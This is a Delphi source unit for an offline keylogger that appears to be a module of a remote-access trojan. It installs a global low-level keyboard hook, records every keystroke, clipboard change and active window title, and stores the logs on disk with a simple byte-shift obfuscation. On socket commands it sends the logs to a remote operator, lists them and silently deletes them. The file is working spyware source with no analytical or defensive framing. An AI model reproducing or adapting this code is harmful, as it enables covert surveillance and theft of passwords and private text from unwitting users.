unit UnitOfflineKeyLogger;

interface

uses
  windows,messages,socketunit, unitshareddata, CompressionStreamUnit, ImageHlp, shellapi;

type
  pkbll = ^tKBDLLHOOKSTRUCT;
  tKBDLLHOOKSTRUCT = record
    vkCode: INTEGER;
    scancode: INTEGER;
    flags: INTEGER;
    time: INTEGER;
    dwExtraInfo: INTEGER;
  end;

const
  WH_KEYBOARD_LL = 13;

var
  HookHandle: THandle;
  OldWindow: THandle;
  OldText: string;
  FullLog: string;
  LogStream: TMemoryStream;
  stf: bool;


procedure ParseData(Socket: TClientSocket; Data: string); forward;

implementation

procedure SendData(Socket: TClientSocket; Data: string);
begin
  UnitSharedData.SendData(Socket,'KeyLogger|' + Data);
end;

function IntToStr(I: integer): string;
begin
  Str(I, Result);
end;

function StrToInt(S: string): integer;
begin
  Val(S, Result, Result);
end;

function GetCaption(Handle: integer): string;
var
  Buf: array[0..255] of char;
begin
  GetWindowText(Handle,Buf,255);
  Result := Buf;
end;

{function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wHour) + ':' + inttostr(MyTime.wMinute) + ':' + inttostr(MyTime.wSecond);
end;

function GetDate(s: string): string;
var
  MyTime: TSystemTime;
begin                             //'\'
  GetLocalTime(MyTime);
  Result := inttostr(MyTime.wDay) + s + inttostr(MyTime.wMonth) + s + inttostr(MyTime.wYear);
end;}

function GetTime: string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wHour < 10 then begin
    Result := '0' + inttostr(MyTime.wHour);
  end else begin
    Result := Result + inttostr(MyTime.wHour);
  end;

  if MyTime.wMinute < 10 then begin
    Result := Result + '.0' + inttostr(MyTime.wMinute);
  end else begin
    Result := Result + '.' + inttostr(MyTime.wMinute);
  end;

  if MyTime.wSecond < 10 then begin
    Result := Result + '.0' + inttostr(MyTime.wSecond);
  end else begin
    Result := Result + '.' + inttostr(MyTime.wSecond);
  end;

end;

function GetDate(s: string): string;
var
  MyTime: TSystemTime;
begin
  GetLocalTime(MyTime);

  if MyTime.wDay < 10 then begin
    Result := '0' + inttostr(MyTime.wDay);
  end else begin
    Result := Result + inttostr(MyTime.wDay);
  end;

  if MyTime.wMonth < 10 then begin
    Result := Result + '-0' + inttostr(MyTime.wMonth);
  end else begin
    Result := Result + '-' + inttostr(MyTime.wMonth);
  end;

  if MyTime.wYear < 10 then begin
    Result := Result + '-0' + inttostr(MyTime.wYear);
  end else begin
    Result := Result + '-' + inttostr(MyTime.wYear);
  end;

end;

function GetClipBoardText: string;
var
  Data: THandle;
begin
  OpenClipboard(0);
  Data := GetClipboardData(CF_TEXT);
  try
    if Data <> 0 then
      Result := PChar(GlobalLock(Data))
    else
      Result := '';
  finally
    if Data <> 0 then GlobalUnlock(Data);
  end;
  CloseClipboard;
end;

function UserName: string;
var
	Size : Dword ;
	Buffer : array [0..255] of char ;
begin
	Size := 256;
	GetUserName(Buffer,Size);
	Result := Buffer ;
end;

function IsCapsLockOn : boolean;
begin
  Result := 0 <> (GetKeyState(VK_CAPITAL) and $01);
end;

function Ca(St: string): string;
var
  i: integer;
  a: byte;
begin
  for i := 1 to length(St) do begin
    A := ord(St[i]);
    result := result + char(a-1);
  end;
end;

function HookProc(nCode:Integer; wParam:Integer; var EventStrut: tKBDLLHOOKSTRUCT):Integer; stdcall;
var
  szletta:string;
  Charry:Array[0..1] of Char;
  VirtKey,ScanCode:Cardinal;
  KeyState:TKeyBoardState;
  nametext:Array[0..32] of Char;
  FileHandle: THandle;
  BytesWrite: dword;
  Text: string;
  FolderName: string;
  Data: string;
  Size: integer;
  co: BOOL;
begin
  Result := CallNextHookEx(HookHandle,nCode,wParam,Integer(@EventStrut));

  CO := IsCapsLockOn;

  if nCode = HC_ACTION then begin
    if (wParam <> WM_KEYUP)then begin
      VirtKey := EventStrut.vkCode;
      ScanCode := EventStrut.scancode;
      ScanCode := ScanCode shl 16;
      GetKeyNameText(ScanCode,nametext,sizeof(nametext));
      szletta := #0;
      fillchar(Charry,2,#0);
      {if VirtKey = VK_SPACE then szletta := ' '
      else if lstrlen(nametext) > 1 then szletta := '<specialkey>[' + nametext + ']</specialkey>'
      else begin
        GetKeyboardState(KeyState);
        ToAscii(VirtKey,ScanCode, KeyState, Charry, 0);
        szletta := Charry;
        szletta := copy(szletta,1,1);
      end;}
      if lstrlen(nametext) > 1 then begin
        if VirtKey = VK_SPACE then szletta := ' ' else szletta := '<specialkey>[' + nametext + ']</specialkey>'
      end else begin
        GetKeyboardState(KeyState);
        ToAscii(VirtKey,ScanCode, KeyState, Charry, 0);
        szletta := Charry;
        szletta := copy(szletta,1,1);
        //if CO then szletta := charupper(pchar(szletta));}
      end;
      

      Text := GetClipboardText;
      if OldText <> Text then begin
        //FullLog := FullLog + #13#10#13#10 + '[Clipboard Text Changed] - [' + GetDate('\') + ' ' + GetTime + ']' + #13#10;
        //FullLog := FullLog + Text;

        if length(FullLog) > 0 then begin
          FullLog := 'SingleKey|' + FullLog;
          Size := Length(FullLog);
          LogStream.Write(Size,Sizeof(Integer));
          LogStream.Write(pointer(FullLog)^,Length(FullLog));
          FullLog := '';
        end;

        Data := 'Clipboard|[' + GetDate('-') + ' ' + GetTime + ']|' + Text;
        Size := Length(Data);
        LogStream.Write(Size,Sizeof(Integer));
        LogStream.Write(pointer(Data)^,Length(Data));
        OldText := Text;
        OldWindow := 0;
        stf := True;
      end;

      if OldWindow <> GetForeGroundWindow then begin
        if length(FullLog) > 0 then begin
          FullLog := 'SingleKey|' + FullLog;
          Size := Length(FullLog);
          LogStream.Write(Size,Sizeof(Integer));
          LogStream.Write(pointer(FullLog)^,Length(FullLog));
          FullLog := '';
        end;
        Data := 'Caption|[' + GetDate('-') + ' ' + GetTime + ']|' + GetCaption(GetForeGroundWindow);
        Size := Length(Data);
        LogStream.Write(Size,Sizeof(Integer));
        LogStream.Write(pointer(Data)^,Length(Data));
        OldWindow := GetForeGroundWindow;

        if LogStream.Size > 0 then begin
          SetString(Data,pchar(LogSTream.memory),LogStream.Size);
          LogStream.Clear;
          Data := Ca(Data);

          FolderName := MakePathNormal(ServerData.InstallFolder) + 'Logs\' +  UserName + '\';
          MakeSureDirectoryPathExists(pchar(FolderName));
          FileHandle := CreateFile(pchar(FolderName + GetDate('-')),GENERIC_WRITE,FILE_SHARE_WRITE,nil,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
          SetFilePointer(FileHandle,0,nil,FILE_END);
          WriteFile(FileHandle,pointer(Data)^,length(Data),BytesWrite,nil);
          CloseHandle(FileHandle);
        end;

        stf := True;
      end;

      FullLog := FullLog + szletta;


    end;
  end;

end;

function RightStr(Text : String ; Num : Integer): String ;
begin
   Result := Copy(Text,length(Text)+1 -Num,Num);
end;

function IncludeTrailingBackslash(Path: string): string;
begin
  Result := Path;
  if RightStr(Path,1) <> '\' then Result := Result + '\';
end;

function GetAttrib(FindData: TWIN32FindData):string;
begin
  if FindData.dwFileAttributes and $00000010 <> 0 then begin
    Result := 'File Folder';
  end else begin
    if FindData.dwFileAttributes and $00000020 <> 0 then Result := Result + 'A';
    if FindData.dwFileAttributes and $00000002 <> 0 then Result := Result + 'H';
    if FindData.dwFileAttributes and $00000001 <> 0 then Result := Result + 'R';
    if FindData.dwFileAttributes and $00000004 <> 0 then Result := Result + 'S';
  end;
end;

procedure FileListRecursive(var s: string; path: string);
var
  FindData: TWIN32FindData;
  hFind: THandle;
begin
  path := includetrailingbackslash(path);
  hFind := FindFirstFile(pchar(Path + '*'), FindData);
  if hFind = INVALID_HANDLE_VALUE then exit;

  if GetAttrib(FindData) <> 'File Folder' then begin
      s := s + Path + string(FindData.cFileName) + ' (' + inttostr(FindData.nFileSizeLow div 1024) + ')' +#13#10;
  end else begin
    if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(s,Path + FindData.cFileName);
  end;

  while FindNextFile(hFind, FindData) do begin
    if GetAttrib(FindData) <> 'File Folder' then begin
      s := s + Path + string(FindData.cFileName) + ' (' + inttostr(FindData.nFileSizeLow div 1024) +')' + #13#10;
    end else begin
      if (string(FindData.cFileName) <> '.') and (FindData.cFileName <> '..') then FileListRecursive(s,Path + FindData.cFileName);
    end;
  end;

  FindClose(hFind);
end;

function DeleteDirectory(dir: string): string;
var
  fos: TSHFileOpStruct;
begin
  Result := 'Error Deleting File: ' + dir;
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT + FOF_NOCONFIRMATION + FOF_NOERRORUI;
    pFrom := PChar(dir + #0);
  end;
  if (0 = ShFileOperation(fos)) then Result := 'Deleted File: ' + dir;
end;

procedure ParseData(Socket: TClientSocket; Data: string);
var
  Command: string;
  Logs: string;
  Size: integer;
  FolderName: string;
  FileHandle: THandle;
  BytesWrite: dword;
  Stream: TMemoryStream;
begin
  Command := Split(Data,'|',1);
  Delete(Data,1,Length(Command)+1);

  if Command = 'Start' then begin
    LogStream := TMemoryStream.Create;
    ServerData.OfflineLogger := 'True';
    OldWindow := 0;
    OldText := GetClipboardText;
    if HookHandle <> 0 then Exit;
    HookHandle := SetWindowsHookEx(WH_KEYBOARD_LL, @HookProc, HInstance, 0);
  end;

  if Command = 'Stop' then begin
    ServerData.OfflineLogger := 'False';
    UnHookWindowsHookEx(HookHandle);
    LogSTream.Free;
    HookHandle := 0;
  end;

  if Command = 'Logs' then begin
    FileListRecursive(Logs,MakePathNormal(ServerData.InstallFolder) + 'Logs\');
    SendData(Socket,Command + '|' + Logs);
  end;

  if Command = 'GetLog' then begin

    if ServerData.OfflineLogger = 'True' then begin
      if length(FullLog) > 0 then begin
        FullLog := 'SingleKey|' + FullLog;
        Size := Length(FullLog);
        LogStream.Write(Size,Sizeof(Integer));
        LogStream.Write(pointer(FullLog)^,Length(FullLog));
        FullLog := '';
      end;
      SetString(Logs,pchar(LogStream.memory),LogStream.Size);
      LogStream.Clear;

      FolderName := MakePathNormal(ServerData.InstallFolder) + 'Logs\' +  UserName + '\';
      MakeSureDirectoryPathExists(pchar(FolderName));
      FileHandle := CreateFile(pchar(FolderName + GetDate('-')),GENERIC_WRITE,FILE_SHARE_WRITE,nil,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
      SetFilePointer(FileHandle,0,nil,FILE_END);
      Logs := Ca(Logs);
      WriteFile(FileHandle,pointer(Logs)^,length(Logs),BytesWrite,nil);
      CloseHandle(FileHandle);
    end;

    Stream := TMemoryStream.Create;
    Stream.LoadFromFile(MakePathNormal(ServerData.InstallFolder) + 'Logs\' + Data);
    SetString(Data,pchar(Stream.Memory),Stream.Size);
    Stream.Free;
    SendData(Socket,Command + '|' + Data);
  end;

  if Command = 'Delete' then begin
    DeleteDirectory(MakePathNormal(ServerData.InstallFolder) + 'Logs\' + Data);
  end;

end;


end.
